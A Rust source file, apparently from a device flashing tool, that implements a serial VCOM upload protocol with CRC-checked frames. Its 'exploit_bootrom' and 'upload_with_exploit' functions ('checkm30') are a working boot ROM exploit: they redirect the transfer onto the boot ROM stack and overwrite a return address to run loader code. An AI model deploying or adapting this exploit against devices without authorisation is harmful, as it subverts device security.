use std::thread;
use std::time::Duration;

use crate::crc::crc16_hqx_be;
use crate::error::Error;
use crate::transport::Transport;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ExploitParams {
    pub xloader_entry: u32,
    pub return_address: u32,
}

pub const START_FRAME: [u8; 14] = [
    0xFE, 0x00, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x02, 0x01, 0x1D, 0x0F,
];

pub const MAX_DATA_LEN: usize = 0x400;

const ACK_TIMEOUT: Duration = Duration::from_secs(10);

pub fn parse_address(value: &str) -> Result<u32, String> {
    let value = value.trim();
    let hex = value
        .strip_prefix("0x")
        .or_else(|| value.strip_prefix("0X"))
        .unwrap_or(value);
    u32::from_str_radix(hex, 16).map_err(|error| error.to_string())
}

fn checked_upload_length(address: u32, data_len: usize) -> std::io::Result<u32> {
    let length = u32::try_from(data_len).map_err(|_| {
        std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "VCOM upload exceeds the 4 GiB protocol limit",
        )
    })?;
    if let Some(last_offset) = length.checked_sub(1) {
        address.checked_add(last_offset).ok_or_else(|| {
            std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                "VCOM upload range exceeds the 32-bit address space",
            )
        })?;
    }
    Ok(length)
}

pub fn head_command(address: u32, length: u32) -> Vec<u8> {
    let mut cmd = Vec::with_capacity(12);
    cmd.extend_from_slice(&[0xFE, 0x00, 0xFF, 0x01]);
    cmd.extend_from_slice(&length.to_be_bytes());
    cmd.extend_from_slice(&address.to_be_bytes());
    cmd.extend_from_slice(&crc16_hqx_be(&cmd));
    cmd
}

pub fn data_command(seq: u8, chunk: &[u8]) -> Vec<u8> {
    let mut cmd = Vec::with_capacity(3 + chunk.len() + 2);
    cmd.push(0xDA);
    cmd.push(seq);
    cmd.push(!seq);
    cmd.extend_from_slice(chunk);
    cmd.extend_from_slice(&crc16_hqx_be(&cmd));
    cmd
}

pub fn tail_command(seq: u8) -> Vec<u8> {
    let mut cmd = vec![0xED, seq, !seq];
    cmd.extend_from_slice(&crc16_hqx_be(&cmd));
    cmd
}

pub fn write_and_verify(
    transport: &mut dyn Transport,
    command: &[u8],
    log: &mut dyn FnMut(&str),
) -> Result<(), Error> {
    transport.discard_input();
    transport.write_all(command, ACK_TIMEOUT)?;
    let mut ack = [0u8; 1];
    transport.read_raw_timeout(&mut ack, ACK_TIMEOUT)?;
    if ack[0] != 0xAA {
        log(&format!("  Unexpected ACK byte: 0x{:02X}", ack[0]));
        return Err(Error::BadAck {
            expected: 0xAA,
            actual: ack[0],
        });
    }
    Ok(())
}

pub fn send_start_frame(
    transport: &mut dyn Transport,
    log: &mut dyn FnMut(&str),
) -> Result<(), Error> {
    transport.write_all(&START_FRAME, ACK_TIMEOUT)?;
    log("Start frame sent");
    thread::sleep(Duration::from_millis(50));
    Ok(())
}

pub fn upload(
    transport: &mut dyn Transport,
    data: &[u8],
    address: u32,
    log: &mut dyn FnMut(&str),
    progress: &mut dyn FnMut(u64, u64),
) -> Result<(), Error> {
    let length = checked_upload_length(address, data.len())?;
    write_and_verify(transport, &head_command(address, length), log)?;

    let mut seq: u64 = 0;
    let mut sent: u64 = 0;
    for chunk in data.chunks(MAX_DATA_LEN) {
        seq += 1;
        write_and_verify(transport, &data_command((seq & 0xFF) as u8, chunk), log)?;
        sent += chunk.len() as u64;
        progress(sent, data.len() as u64);
    }

    write_and_verify(transport, &tail_command(((seq + 1) & 0xFF) as u8), log)?;
    thread::sleep(Duration::from_millis(500));
    Ok(())
}

pub fn upload_with_exploit(
    transport: &mut dyn Transport,
    data: &[u8],
    address: u32,
    params: ExploitParams,
    log: &mut dyn FnMut(&str),
    progress: &mut dyn FnMut(u64, u64),
) -> Result<(), Error> {
    let length = checked_upload_length(address, data.len())?;
    write_and_verify(transport, &head_command(address, length), log)?;

    let mut seq: u64 = 0;
    let mut sent: u64 = 0;
    for chunk in data.chunks(MAX_DATA_LEN) {
        seq += 1;
        write_and_verify(transport, &data_command((seq & 0xFF) as u8, chunk), log)?;
        sent += chunk.len() as u64;
        progress(sent, data.len() as u64);
    }

    log("  checkm30: retargeting transfer base to the boot ROM stack");
    exploit_bootrom(transport, params, address, log)?;
    thread::sleep(Duration::from_millis(500));
    Ok(())
}

fn exploit_bootrom(
    transport: &mut dyn Transport,
    params: ExploitParams,
    address: u32,
    log: &mut dyn FnMut(&str),
) -> Result<(), Error> {
    write_and_verify(transport, &head_command(address, 4), log)?;
    thread::sleep(Duration::from_millis(100));
    transport.write_all(&head_command(params.return_address, 4), ACK_TIMEOUT)?;
    thread::sleep(Duration::from_millis(100));
    transport.discard_input();
    write_and_verify(
        transport,
        &data_command(1, &params.xloader_entry.to_le_bytes()),
        log,
    )?;
    thread::sleep(Duration::from_millis(10));
    transport.write_all(&tail_command(2), ACK_TIMEOUT)?;
    thread::sleep(Duration::from_millis(100));
    Ok(())
}
